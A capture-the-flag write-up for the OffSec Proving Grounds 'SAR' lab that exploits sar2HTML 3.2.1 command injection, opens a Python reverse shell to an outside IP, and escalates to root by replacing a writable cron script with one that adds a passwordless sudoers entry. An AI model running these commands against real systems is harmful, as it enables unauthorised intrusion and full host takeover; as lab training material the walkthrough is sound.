* * *
  ### Lab: SAR 
  PROVING GROUNDS(OFFSEC)
* * *  

- Rustscan's result

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/97284a17-94cb-4f78-8f88-19a4ad4f679a)

- FFuf's result reveals a robots.txt file

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/41e46114-78d0-4ba4-b515-4714e29e30ea)

- Robots.txt reveals a "sar2HTML" directory

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/0bc608fb-cc28-4367-8fca-7fd69edf36a0)

- The sar2HTML directory reveals a sar2HTML ver  3.2.1 page on the server

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/fb297a18-93de-49ba-a9a7-c6eeac73bde8)

- According to exploitDB, this version of sar2HTML is vulnerable to rce and we can pop a rev shell via that vulnerability.<a href="https://www.exploit-db.com/exploits/47204">Link to the
  details</a>

       # Exploit Title: sar2html Remote Code Execution
       # Date: 01/08/2019
       # Exploit Author: Furkan KAYAPINAR
       # Vendor Homepage:https://github.com/cemtan/sar2html 
       # Software Link: https://sourceforge.net/projects/sar2html/
       # Version: 3.2.1
       # Tested on: Centos 7

      In web application you will see index.php?plot url extension.

      http://<ipaddr>/index.php?plot=;<command-here> will execute 
      the command you entered. After command injection press "select # host" then your command's 
      output will appear bottom side of the scroll screen.
            
- Testing it reveals this

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/16367f87-5490-46fd-9383-3668cf8a484d)

### Foothold
- Popping a revshell with python3 code "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.164",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"
  and stabilizing it

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/79d334c2-9911-401b-a69d-76220dc499bc)

### Privesc with cronjob running a writable script as root

- View existing cronjob with "cat /etc/crontab"

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9d1d9bc0-f8b8-4e3c-8a3f-63cdce079faf)

- Checking the status of the cron job with "service cron status"

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/bf0e8c78-bddb-4175-a0ac-77b1468b069f)

- We have write permissions for the script that finally.sh is running

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/2a213b1e-188f-4cbf-a88e-25c2add6eb56)

- I got this script from this site to write a command to /etc/sudoers to allow www-data to use sudo without a password.<a href="https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation">Link to script</a>

      #! /usr/bin/env python3
      import os
      import sys
      try:
         print("on it")
         os.system("echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
      except:
          print("Didn't work")
          sys.exit()
- We will receive the file via python http.server,delete write.sh and set our malicious write.sh for the cronjob to run and wait for some minutes.

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/90221deb-16e0-411d-b045-22bd1bd10c3d)

- Gain root access with "sudo bash"

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3966397a-d9ac-4a05-8262-3b1d020669f6)

- Root access gained
  
 
  
   

